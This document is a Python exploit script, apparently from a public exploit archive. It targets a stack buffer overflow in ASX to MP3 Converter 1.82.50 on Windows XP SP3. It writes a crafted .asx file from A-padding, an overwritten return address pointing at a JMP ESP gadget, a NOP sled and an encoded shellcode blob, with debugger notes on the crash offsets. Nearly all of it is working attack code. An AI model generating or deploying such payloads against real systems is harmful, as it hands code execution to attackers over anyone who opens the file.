#!/usr/bin/python
'''
# Exploit Title: ASX to MP3 Converter 1.82.50 Stack Overflow
# Date: 2 Oct 2015
# Exploit Author: ex_ptr
# Vendor Homepage: http://mini-stream.net
# Version: 1.82.50
# Tested on: Windows XP SP3
'''

import struct
filename = "exploit.asx"

dummyLen = 0x101 - 8

unique500 = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq'
badChars = b'\x00\x0a\x1a'
badCharPattern = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'

# Shell = b'Z'*144
Shell =  b""
Shell += b"\xbb\xfb\x82\x50\xb3\xda\xc0\xd9\x74\x24\xf4\x5a"
Shell += b"\x29\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x0e\x03\xa1"
Shell += b"\x8c\xb2\x46\xa9\x79\xb0\xa9\x51\x7a\xd5\x20\xb4"
Shell += b"\x4b\xd5\x57\xbd\xfc\xe5\x1c\x93\xf0\x8e\x71\x07"
Shell += b"\x82\xe3\x5d\x28\x23\x49\xb8\x07\xb4\xe2\xf8\x06"
Shell += b"\x36\xf9\x2c\xe8\x07\x32\x21\xe9\x40\x2f\xc8\xbb"
Shell += b"\x19\x3b\x7f\x2b\x2d\x71\xbc\xc0\x7d\x97\xc4\x35"
Shell += b"\x35\x96\xe5\xe8\x4d\xc1\x25\x0b\x81\x79\x6c\x13"
Shell += b"\xc6\x44\x26\xa8\x3c\x32\xb9\x78\x0d\xbb\x16\x45"
Shell += b"\xa1\x4e\x66\x82\x06\xb1\x1d\xfa\x74\x4c\x26\x39"
Shell += b"\x06\x8a\xa3\xd9\xa0\x59\x13\x05\x50\x8d\xc2\xce"
Shell += b"\x5e\x7a\x80\x88\x42\x7d\x45\xa3\x7f\xf6\x68\x63"
Shell += b"\xf6\x4c\x4f\xa7\x52\x16\xee\xfe\x3e\xf9\x0f\xe0"
Shell += b"\xe0\xa6\xb5\x6b\x0c\xb2\xc7\x36\x59\x77\xea\xc8"
Shell += b"\x99\x1f\x7d\xbb\xab\x80\xd5\x53\x80\x49\xf0\xa4"
Shell += b"\xe7\x63\x44\x3a\x16\x8c\xb5\x13\xdd\xd8\xe5\x0b"
Shell += b"\xf4\x60\x6e\xcb\xf9\xb4\x21\x9b\x55\x67\x82\x4b"
Shell += b"\x16\xd7\x6a\x81\x99\x08\x8a\xaa\x73\x21\x21\x51"
Shell += b"\x14\x8e\x1e\x2e\x37\x66\x5d\xd0\xb6\xcc\xe8\x36"
Shell += b"\xd2\x22\xbd\xe1\x4b\xda\xe4\x79\xed\x23\x33\x04"
Shell += b"\x2d\xaf\xb0\xf9\xe0\x58\xbc\xe9\x95\xa8\x8b\x53"
Shell += b"\x33\xb6\x21\xfb\xdf\x25\xae\xfb\x96\x55\x79\xac"
Shell += b"\xff\xa8\x70\x38\x12\x92\x2a\x5e\xef\x42\x14\xda"
Shell += b"\x34\xb7\x9b\xe3\xb9\x83\xbf\xf3\x07\x0b\x84\xa7"
Shell += b"\xd7\x5a\x52\x11\x9e\x34\x14\xcb\x48\xea\xfe\x9b"
Shell += b"\x0d\xc0\xc0\xdd\x11\x0d\xb7\x01\xa3\xf8\x8e\x3e"
Shell += b"\x0c\x6d\x07\x47\x70\x0d\xe8\x92\x30\x2d\x0b\x36"
Shell += b"\x4d\xc6\x92\xd3\xec\x8b\x24\x0e\x32\xb2\xa6\xba"
Shell += b"\xcb\x41\xb6\xcf\xce\x0e\x70\x3c\xa3\x1f\x15\x42"
Shell += b"\x10\x1f\x3c"

dummy = b"A"*dummyLen
#dummy = b'Z' * (dummyLen - len(badCharPattern)) + badCharPattern


#### Caller 77B197BC
#### Crash Memory at 0x00149d74
#### Load Memory at 0x0014DD89
#### EIP loads in at 00149E74
#### EIP @ Offset 249
#### ESP points to 00149E7C
#### ESP @ Offset 257  -- JMP ESP - FFE4 - struct.pack('<I',0x100c789D) 
#### ECX @ Offset 237  -- JMP ECX - FFE1 - struct.pack('<I',0x

# EIP   = struct.pack('<I', 0x76af3adc)
EIP   = struct.pack('<I', 0x1003789d)
FF  = b"\xFF\xFF\xFF\xFF"
NOP   = b"\x90"*8

exploit = dummy + EIP + FF + NOP + Shell

print( "Length of dummy:  " + str(len(dummy)) + " Length of exploit:  " + str(len(exploit) ) )

f = open(filename,'wb')
f.write(exploit)
f.close()
